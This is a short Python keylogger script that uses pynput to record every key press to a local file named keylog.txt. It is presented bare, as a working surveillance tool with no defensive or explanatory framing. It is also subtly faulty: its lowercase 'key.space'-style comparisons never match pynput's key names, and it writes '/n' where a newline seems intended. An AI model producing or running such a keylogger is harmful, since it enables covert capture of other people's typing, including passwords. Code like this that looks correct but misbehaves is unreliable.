from pynput.keyboard import Listener

key_info = 'keylog.txt'

def write_to_file(key):
    log = str(key)
    log = log.replace("'", "")

    if log == 'key.space':
        log = ' '
    if log == 'key.enter':
        log = '/n'

    if log == 'key.tab':
        log = ' '
    if log == 'key.shift':
        log = ''
    if log == 'key.backspace':
        log = ' [BACKSPACE] '

    with open(key_info, 'a') as i:
        i.write(log)
        

with Listener(on_press=write_to_file) as listener:
    listener.join()